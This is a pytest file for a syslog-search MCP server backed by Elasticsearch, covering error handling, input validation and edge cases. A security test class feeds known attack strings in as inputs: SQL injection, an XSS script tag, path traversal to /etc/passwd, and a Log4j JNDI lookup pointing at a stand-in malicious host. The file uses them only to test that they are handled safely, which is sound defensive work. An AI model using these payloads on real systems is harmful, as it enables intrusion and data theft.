"""
Comprehensive error handling and edge case tests for syslog-mcp.

These tests ensure the system handles errors gracefully and provides
meaningful error messages to users while maintaining system stability.
"""

import pytest
import asyncio
from datetime import datetime, timezone, timedelta
from unittest.mock import AsyncMock, Mock, patch

from elasticsearch.exceptions import (
    ConnectionError as ESConnectionError,
    AuthenticationException,
    RequestError,
    NotFoundError,
    TransportError,
)

from syslog_mcp.exceptions import (
    ElasticsearchConnectionError,
    ElasticsearchQueryError, 
    ElasticsearchTimeoutError,
    ElasticsearchAuthenticationError,
)
from hypothesis import given, strategies as st


@pytest.mark.error_handling
class TestElasticsearchErrorHandling:
    """Test handling of various Elasticsearch errors."""
    
    async def test_connection_error_handling(self, fastmcp_client_mock, monkeypatch):
        """Test handling when Elasticsearch is unreachable."""
        # Mock ES client to raise connection error
        mock_es_client = fastmcp_client_mock._server_instance._elasticsearch_client
        mock_es_client.search.side_effect = ESConnectionError("Connection refused")
        
        result = await fastmcp_client_mock.call_tool("search_logs", {
            "query": "test"
        })
        
        assert result.is_error is True
        error_message = result.error_data.get("message", "").lower()
        assert any(keyword in error_message for keyword in [
            "connection", "elasticsearch", "unavailable", "refused"
        ])

    async def test_authentication_error_handling(self, fastmcp_client_mock, monkeypatch):
        """Test handling of Elasticsearch authentication errors."""
        mock_es_client = fastmcp_client_mock._server_instance._elasticsearch_client
        mock_es_client.search.side_effect = AuthenticationException("Invalid credentials")
        
        result = await fastmcp_client_mock.call_tool("search_logs", {
            "query": "test"
        })
        
        assert result.is_error is True
        error_message = result.error_data.get("message", "").lower()
        assert any(keyword in error_message for keyword in [
            "authentication", "credentials", "unauthorized", "auth"
        ])

    async def test_malformed_query_error_handling(self, fastmcp_client_mock, monkeypatch):
        """Test handling of malformed Elasticsearch queries."""
        mock_es_client = fastmcp_client_mock._server_instance._elasticsearch_client
        mock_es_client.search.side_effect = RequestError("Invalid query syntax")
        
        result = await fastmcp_client_mock.call_tool("search_logs", {
            "query": "malformed:query::syntax:::"
        })
        
        assert result.is_error is True
        error_message = result.error_data.get("message", "").lower()
        assert any(keyword in error_message for keyword in [
            "query", "syntax", "invalid", "malformed"
        ])

    async def test_index_not_found_error_handling(self, fastmcp_client_mock, monkeypatch):
        """Test handling when requested index doesn't exist."""
        mock_es_client = fastmcp_client_mock._server_instance._elasticsearch_client
        mock_es_client.search.side_effect = NotFoundError("Index not found")
        
        result = await fastmcp_client_mock.call_tool("search_logs", {
            "query": "test"
        })
        
        assert result.is_error is True
        error_message = result.error_data.get("message", "").lower()
        assert any(keyword in error_message for keyword in [
            "index", "not found", "missing", "unavailable"
        ])

    async def test_timeout_error_handling(self, fastmcp_client_mock, monkeypatch):
        """Test handling of query timeouts."""
        mock_es_client = fastmcp_client_mock._server_instance._elasticsearch_client
        mock_es_client.search.side_effect = ElasticsearchTimeoutError("Query timeout")
        
        result = await fastmcp_client_mock.call_tool("search_logs", {
            "query": "very_complex_query_that_times_out",
            "limit": 1000
        })
        
        assert result.is_error is True
        error_message = result.error_data.get("message", "").lower()
        assert any(keyword in error_message for keyword in [
            "timeout", "time out", "slow", "exceeded"
        ])

    async def test_transport_error_handling(self, fastmcp_client_mock, monkeypatch):
        """Test handling of transport-level errors."""
        mock_es_client = fastmcp_client_mock._server_instance._elasticsearch_client
        mock_es_client.search.side_effect = TransportError("Transport failed")
        
        result = await fastmcp_client_mock.call_tool("search_logs", {
            "query": "test"
        })
        
        assert result.is_error is True
        error_message = result.error_data.get("message", "").lower()
        assert any(keyword in error_message for keyword in [
            "transport", "network", "connection", "failed"
        ])

    async def test_generic_exception_handling(self, fastmcp_client_mock, monkeypatch):
        """Test handling of unexpected exceptions."""
        mock_es_client = fastmcp_client_mock._server_instance._elasticsearch_client
        mock_es_client.search.side_effect = Exception("Unexpected error occurred")
        
        result = await fastmcp_client_mock.call_tool("search_logs", {
            "query": "test"
        })
        
        assert result.is_error is True
        error_message = result.error_data.get("message", "").lower()
        assert "error" in error_message

    async def test_partial_elasticsearch_failure(self, fastmcp_client_mock, monkeypatch):
        """Test handling when Elasticsearch returns partial results."""
        mock_es_client = fastmcp_client_mock._server_instance._elasticsearch_client
        
        # Mock partial failure response
        partial_response = {
            "took": 100,
            "timed_out": True,  # Partial timeout
            "hits": {
                "total": {"value": 50, "relation": "gte"},
                "hits": [
                    {
                        "_source": {
                            "timestamp": "2025-01-15T10:30:00Z",
                            "device": "server-01",
                            "message": "Partial result",
                            "program": "test",
                            "level": "info"
                        }
                    }
                ]
            },
            "_shards": {
                "total": 5,
                "successful": 3,
                "failed": 2
            }
        }
        
        mock_es_client.search.return_value = partial_response
        
        result = await fastmcp_client_mock.call_tool("search_logs", {
            "query": "test"
        })
        
        # Should succeed but indicate partial results
        assert result.is_error is False
        data = result.data
        assert data["status"] == "success"
        
        # Should have some indication of partial results
        # (exact implementation depends on how partial results are handled)


@pytest.mark.error_handling
class TestParameterValidationErrors:
    """Test comprehensive parameter validation error handling."""
    
    @pytest.mark.parametrize("invalid_limit", [
        -1, 0, 1001, 99999, "not_a_number", None, 3.14, []
    ])
    async def test_invalid_limit_parameters(self, fastmcp_client_mock, invalid_limit):
        """Test validation of invalid limit parameters."""
        result = await fastmcp_client_mock.call_tool("search_logs", {
            "query": "test",
            "limit": invalid_limit
        })
        
        assert result.is_error is True
        # Should contain validation error information

    @pytest.mark.parametrize("invalid_offset", [
        -1, -10, "negative", None, 3.14, []
    ])
    async def test_invalid_offset_parameters(self, fastmcp_client_mock, invalid_offset):
        """Test validation of invalid offset parameters."""
        result = await fastmcp_client_mock.call_tool("search_logs", {
            "query": "test",
            "offset": invalid_offset
        })
        
        assert result.is_error is True

    @pytest.mark.parametrize("invalid_datetime", [
        "not-a-date",
        "2025-13-45T10:30:00Z",  # Invalid month
        "2025-01-32T10:30:00Z",  # Invalid day
        "2025-01-15T25:30:00Z",  # Invalid hour
        "25/01/2025",           # Wrong format
        "2025-01-15 10:30:00",  # Missing timezone
        "",                     # Empty string
        123456789,              # Timestamp instead of ISO string
        None,                   # None (might be valid in some cases)
    ])
    async def test_invalid_datetime_parameters(self, fastmcp_client_mock, invalid_datetime):
        """Test validation of invalid datetime parameters."""
        result = await fastmcp_client_mock.call_tool("search_logs", {
            "start_time": invalid_datetime
        })
        
        # Should fail validation for clearly invalid formats
        if invalid_datetime not in [None]:  # None might be acceptable
            assert result.is_error is True

    async def test_end_time_before_start_time(self, fastmcp_client_mock):
        """Test validation when end_time is before start_time."""
        start_time = datetime.now(timezone.utc)
        end_time = start_time - timedelta(hours=1)  # Before start
        
        result = await fastmcp_client_mock.call_tool("search_logs", {
            "start_time": start_time.isoformat(),
            "end_time": end_time.isoformat()
        })
        
        assert result.is_error is True
        error_message = result.error_data.get("message", "").lower()
        assert any(keyword in error_message for keyword in [
            "time", "range", "before", "after", "invalid"
        ])

    @pytest.mark.parametrize("invalid_level", [
        "invalid_level",
        "UNKNOWN", 
        123,
        [],
        {"level": "info"},
        ""
    ])
    async def test_invalid_log_level_parameters(self, fastmcp_client_mock, invalid_level):
        """Test validation of invalid log level parameters."""
        result = await fastmcp_client_mock.call_tool("search_logs", {
            "query": "test",
            "level": invalid_level
        })
        
        assert result.is_error is True

    @pytest.mark.parametrize("invalid_sort_order", [
        "ASCENDING",
        "DESCENDING", 
        "up",
        "down",
        123,
        [],
        None
    ])
    async def test_invalid_sort_order_parameters(self, fastmcp_client_mock, invalid_sort_order):
        """Test validation of invalid sort order parameters."""
        result = await fastmcp_client_mock.call_tool("search_logs", {
            "query": "test",
            "sort_order": invalid_sort_order
        })
        
        assert result.is_error is True

    async def test_extremely_large_limit(self, fastmcp_client_mock):
        """Test handling of extremely large limit values."""
        result = await fastmcp_client_mock.call_tool("search_logs", {
            "limit": 999999999  # Extremely large
        })
        
        assert result.is_error is True

    async def test_extremely_large_offset(self, fastmcp_client_mock):
        """Test handling of extremely large offset values."""
        result = await fastmcp_client_mock.call_tool("search_logs", {
            "offset": 999999999  # Extremely large
        })
        
        # Might succeed but should be handled gracefully
        # Large offsets can cause performance issues but might not be validation errors


@pytest.mark.error_handling
class TestDeviceAnalysisErrorHandling:
    """Test error handling for device analysis tools."""
    
    async def test_syslog_sec_invalid_mode(self, fastmcp_client_mock):
        """Test syslog_sec with completely invalid mode."""
        result = await fastmcp_client_mock.call_tool("syslog_sec", {
            "mode": "completely_invalid_mode_xyz123"
        })
        
        # Should either fail validation or return meaningful error
        if not result.is_error:
            # If not failing, should contain error information in response
            error_indicators = ["error", "invalid", "unknown", "unsupported"]
            assert any(indicator in result.data.lower() for indicator in error_indicators)
        else:
            assert result.is_error is True

    async def test_syslog_tail_missing_device(self, fastmcp_client_mock):
        """Test syslog_tail without required device parameter."""
        result = await fastmcp_client_mock.call_tool("syslog_tail", {
            "lines": 10
            # Missing required 'device' parameter
        })
        
        assert result.is_error is True

    async def test_syslog_tail_invalid_lines_parameter(self, fastmcp_client_mock):
        """Test syslog_tail with invalid lines parameter."""
        invalid_lines = [-1, 0, "not_a_number", [], None, 3.14]
        
        for lines in invalid_lines:
            result = await fastmcp_client_mock.call_tool("syslog_tail", {
                "device": "server-01",
                "lines": lines
            })
            
            assert result.is_error is True

    async def test_syslog_reports_invalid_severity(self, fastmcp_client_mock):
        """Test syslog_reports with invalid severity parameter."""
        result = await fastmcp_client_mock.call_tool("syslog_reports", {
            "mode": "error_analysis",
            "severity": "completely_invalid_severity"
        })
        
        # Should handle invalid severity gracefully
        if not result.is_error:
            assert "error" in result.data.lower() or "invalid" in result.data.lower()
        else:
            assert result.is_error is True

    async def test_syslog_alerts_missing_required_fields(self, fastmcp_client_mock):
        """Test syslog_alerts create_rule mode with missing required fields."""
        # Missing required fields for create_rule mode
        result = await fastmcp_client_mock.call_tool("syslog_alerts", {
            "mode": "create_rule"
            # Missing name, query, threshold
        })
        
        # Should fail due to missing required parameters
        if not result.is_error:
            # If not failing validation, should indicate missing parameters
            error_indicators = ["missing", "required", "name", "query"]
            assert any(indicator in result.data.lower() for indicator in error_indicators)
        else:
            assert result.is_error is True


@pytest.mark.error_handling
class TestEdgeCases:
    """Test edge cases and boundary conditions."""
    
    async def test_empty_query_string(self, fastmcp_client_mock):
        """Test search with empty query string."""
        result = await fastmcp_client_mock.call_tool("search_logs", {
            "query": "",  # Empty string
            "limit": 10
        })
        
        # Empty query should be handled gracefully (might return all logs)
        assert result.is_error is False
        assert result.data["status"] == "success"

    async def test_null_query_string(self, fastmcp_client_mock):
        """Test search with null query string."""
        result = await fastmcp_client_mock.call_tool("search_logs", {
            "query": None,  # Null/None
            "limit": 10
        })
        
        # None query should be handled gracefully
        assert result.is_error is False
        assert result.data["status"] == "success"

    async def test_very_long_query_string(self, fastmcp_client_mock):
        """Test search with extremely long query string."""
        long_query = "a" * 10000  # 10k character query
        
        result = await fastmcp_client_mock.call_tool("search_logs", {
            "query": long_query,
            "limit": 10
        })
        
        # Should handle long queries gracefully (might succeed or fail validation)
        # Exact behavior depends on implementation limits

    async def test_unicode_and_special_characters(self, fastmcp_client_mock):
        """Test search with Unicode and special characters."""
        special_queries = [
            "测试查询",  # Chinese characters
            "тест запрос",  # Cyrillic
            "🔍 search emoji 🚨",  # Emojis
            "query with\nnewlines\tand\ttabs",  # Whitespace
            'query "with" \'quotes\'',  # Quotes
            "query\\with\\backslashes",  # Backslashes
            "query & ampersand | pipe",  # Special operators
            "<script>alert('xss')</script>",  # Potential XSS
        ]
        
        for query in special_queries:
            result = await fastmcp_client_mock.call_tool("search_logs", {
                "query": query,
                "limit": 5
            })
            
            # Should handle special characters gracefully without crashing
            assert result.is_error is False
            assert result.data["status"] == "success"

    async def test_minimum_boundary_values(self, fastmcp_client_mock):
        """Test minimum boundary values for numeric parameters."""
        result = await fastmcp_client_mock.call_tool("search_logs", {
            "limit": 1,    # Minimum valid limit
            "offset": 0,   # Minimum valid offset
        })
        
        assert result.is_error is False
        assert result.data["limit"] == 1
        assert result.data["offset"] == 0

    async def test_maximum_boundary_values(self, fastmcp_client_mock):
        """Test maximum boundary values for numeric parameters."""
        result = await fastmcp_client_mock.call_tool("search_logs", {
            "limit": 1000,  # Maximum valid limit
            "offset": 0,
        })
        
        assert result.is_error is False
        assert result.data["limit"] == 1000

    async def test_device_name_edge_cases(self, fastmcp_client_mock):
        """Test device names with edge case formats."""
        edge_case_devices = [
            "",  # Empty string
            " ",  # Whitespace only
            "device with spaces",  # Spaces
            "device-with-dashes",  # Dashes
            "device_with_underscores",  # Underscores
            "UPPERCASE-DEVICE",  # Uppercase
            "device.with.dots",  # Dots
            "device123",  # Numbers
            "123device",  # Starting with numbers
            "very-long-device-name-that-exceeds-normal-expectations-for-device-naming-conventions",  # Very long
        ]
        
        for device in edge_case_devices:
            result = await fastmcp_client_mock.call_tool("search_logs", {
                "device": device,
                "limit": 5
            })
            
            # Should handle various device name formats
            assert result.is_error is False
            assert result.data["status"] == "success"

    async def test_time_edge_cases(self, fastmcp_client_mock):
        """Test edge cases for time parameters."""
        now = datetime.now(timezone.utc)
        
        # Very recent time range (1 second)
        start_time = now - timedelta(seconds=1)
        end_time = now
        
        result = await fastmcp_client_mock.call_tool("search_logs", {
            "start_time": start_time.isoformat(),
            "end_time": end_time.isoformat(),
            "limit": 10
        })
        
        assert result.is_error is False
        
        # Very old time range
        old_start = datetime(2020, 1, 1, tzinfo=timezone.utc)
        old_end = datetime(2020, 1, 2, tzinfo=timezone.utc)
        
        result = await fastmcp_client_mock.call_tool("search_logs", {
            "start_time": old_start.isoformat(),
            "end_time": old_end.isoformat(),
            "limit": 10
        })
        
        assert result.is_error is False

    async def test_concurrent_error_conditions(self, fastmcp_client_mock, monkeypatch):
        """Test error handling under concurrent access."""
        # Simulate intermittent errors
        mock_es_client = fastmcp_client_mock._server_instance._elasticsearch_client
        
        error_count = 0
        original_search = mock_es_client.search
        
        async def intermittent_error(*args, **kwargs):
            nonlocal error_count
            error_count += 1
            if error_count % 3 == 0:  # Every third call fails
                raise ESConnectionError("Intermittent failure")
            return await original_search(*args, **kwargs)
        
        mock_es_client.search = intermittent_error
        
        # Run concurrent requests
        tasks = []
        for i in range(6):
            task = fastmcp_client_mock.call_tool("search_logs", {
                "query": f"concurrent test {i}",
                "limit": 5
            })
            tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Some should succeed, some should fail gracefully
        success_count = sum(1 for r in results if not isinstance(r, Exception) and not r.is_error)
        error_count = sum(1 for r in results if isinstance(r, Exception) or (hasattr(r, 'is_error') and r.is_error))
        
        assert success_count > 0  # Some should succeed
        assert error_count > 0    # Some should fail as expected


@pytest.mark.error_handling
@pytest.mark.security
class TestSecurityErrorHandling:
    """Test error handling for security-related edge cases."""
    
    async def test_injection_attempt_handling(self, fastmcp_client_mock):
        """Test handling of potential injection attacks in queries."""
        injection_attempts = [
            "'; DROP TABLE logs; --",  # SQL injection attempt
            "<script>alert('xss')</script>",  # XSS attempt
            "../../../etc/passwd",  # Path traversal attempt
            "${jndi:ldap://malicious.com/attack}",  # Log4j injection attempt
            "{{7*7}}",  # Template injection attempt
            "eval('malicious code')",  # Code injection attempt
        ]
        
        for injection in injection_attempts:
            result = await fastmcp_client_mock.call_tool("search_logs", {
                "query": injection,
                "limit": 5
            })
            
            # Should handle injection attempts safely without executing them
            assert result.is_error is False
            assert result.data["status"] == "success"
            # Should not execute the malicious code

    async def test_denial_of_service_prevention(self, fastmcp_client_mock):
        """Test prevention of potential DoS attacks through parameters."""
        # Attempt to cause resource exhaustion
        result = await fastmcp_client_mock.call_tool("search_logs", {
            "query": ".*.*.*.*.*",  # Potentially expensive regex
            "limit": 1000,  # Large result set
        })
        
        # Should either succeed with reasonable performance or fail gracefully
        # Should not hang or consume excessive resources
        assert result.is_error is False or result.is_error is True  # Either is acceptable
        
        if result.is_error:
            # If it fails, should be due to validation, not system crash
            error_message = result.error_data.get("message", "").lower()
            assert any(keyword in error_message for keyword in [
                "invalid", "complex", "timeout", "limit", "resource"
            ])

    async def test_path_traversal_in_device_names(self, fastmcp_client_mock):
        """Test handling of path traversal attempts in device names."""
        traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/passwd",
            "C:\\Windows\\System32",
            "device/../../../secret",
        ]
        
        for device_name in traversal_attempts:
            result = await fastmcp_client_mock.call_tool("search_logs", {
                "device": device_name,
                "limit": 5
            })
            
            # Should handle path traversal attempts safely
            assert result.is_error is False
            assert result.data["status"] == "success"
            # Should not access filesystem paths


@given(
    query=st.one_of(st.none(), st.text(min_size=0, max_size=200)),
    limit=st.integers(min_value=1, max_value=1000),
    offset=st.integers(min_value=0, max_value=1000),
    device=st.one_of(st.none(), st.text(min_size=1, max_size=50))
)
@pytest.mark.error_handling
async def test_search_logs_property_based_error_handling(
    fastmcp_client_mock, query, limit, offset, device
):
    """Property-based test for search_logs error handling."""
    result = await fastmcp_client_mock.call_tool("search_logs", {
        "query": query,
        "limit": limit, 
        "offset": offset,
        "device": device
    })
    
    # With valid ranges, should always succeed
    assert result.is_error is False
    
    # Basic invariants should hold
    data = result.data
    assert data["status"] == "success"
    assert data["limit"] == limit
    assert data["offset"] == offset
    assert isinstance(data["total_hits"], int)
    assert data["total_hits"] >= 0
    assert isinstance(data["logs"], list)
    assert len(data["logs"]) <= limit